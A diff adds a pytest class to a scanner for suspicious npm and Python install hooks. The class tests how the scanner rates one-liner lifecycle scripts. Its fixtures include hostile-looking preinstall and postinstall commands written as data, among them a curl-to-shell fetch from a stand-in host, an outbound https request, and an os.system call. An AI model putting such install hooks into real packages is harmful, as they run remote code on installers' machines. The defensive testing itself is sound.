@@ -6979,3 +6979,80 @@ class TestAPemBlockTooSmallToBeAKey:
         assert is_test_material("pkg/__fixtures__/key.pem")
         assert not is_test_material("src/__init__.py")
         assert not is_test_material("src/main.py")
+
+
+class TestAOneLinerThatOnlyTalks:
+    """`node -e` and `python -c` are in `HOSTILE_IN_LIFECYCLE` because they take a string
+    and run it, which is the shape every second-stage loader uses. They are also how a
+    package prints a message or declines to install.
+
+    `electron` sets `"preinstall": "node -e 'process.exit(0)'"` so that `npm install`
+    fails and people use yarn. `OpenHands` uses the same construct to print a welcome
+    message naming the command to run next. Both were reported at HIGH through the
+    "performs unexpected operations" branch, which sets that severity unconditionally --
+    so being the project's own manifest did not help.
+
+    The engine already draws this distinction for hook PATHS: `PRINTING_COMMANDS` and
+    `Engine._runs` strip printer segments before resolving what a lifecycle script
+    reaches. The manifest detector had no equivalent for the program inside a `-e`.
+
+    Still reported, through the branch that says a script runs at install time and is not
+    a recognised build step. What changes is that a message does not read as an
+    operation.
+    """
+
+    @staticmethod
+    def _manifest(tmp_path, scripts: dict) -> list:
+        import json
+        import subprocess
+
+        (tmp_path / "package.json").write_text(
+            json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts})
+        )
+        # A git root, because `_is_first_party` asks whether the scan target IS one --
+        # without it every manifest reads as a downloaded package and the severity under
+        # test is the wrong one.
+        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id.startswith(("SUSPECT.INSTALL", "MALWARE.INSTALL"))
+        ]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "node -e 'process.exit(0)'",
+            "node -e \"console.log('installed')\"",
+            "python -c 'print(\"done\")'",
+        ],
+    )
+    def test_a_message_or_an_exit_does_not_block(self, tmp_path, command: str) -> None:
+        hits = self._manifest(tmp_path, {"preinstall": command})
+        assert hits, "still reported: it does run at install time"
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "node -e \"require('child_process').execSync('prek install')\"",
+            "node -e \"require('https').get(process.env.U)\"",
+            "python -c \"import os; os.system('id')\"",
+        ],
+    )
+    def test_a_one_liner_that_does_work_still_blocks(self, tmp_path, command: str) -> None:
+        """The control. `cherry-studio`'s `prepare` installs a git hook with
+        `require('child_process').execSync`, which is exactly what must not be excused --
+        and any substring from `NOT_INERT` disqualifies the whole command, so a program
+        that prints AND does something else is not covered either."""
+        hits = self._manifest(tmp_path, {"postinstall": command})
+        assert [f for f in hits if f.severity >= Severity.HIGH]
+
+    def test_a_fetch_and_run_is_still_critical(self, tmp_path) -> None:
+        hits = self._manifest(
+            tmp_path,
+            {
+                "postinstall": "node -e \"require('child_process').execSync('curl -s https://x.test|sh')\""
+            },
+        )
+        assert [f for f in hits if f.rule_id == "MALWARE.INSTALL.FETCH_EXEC.001"]
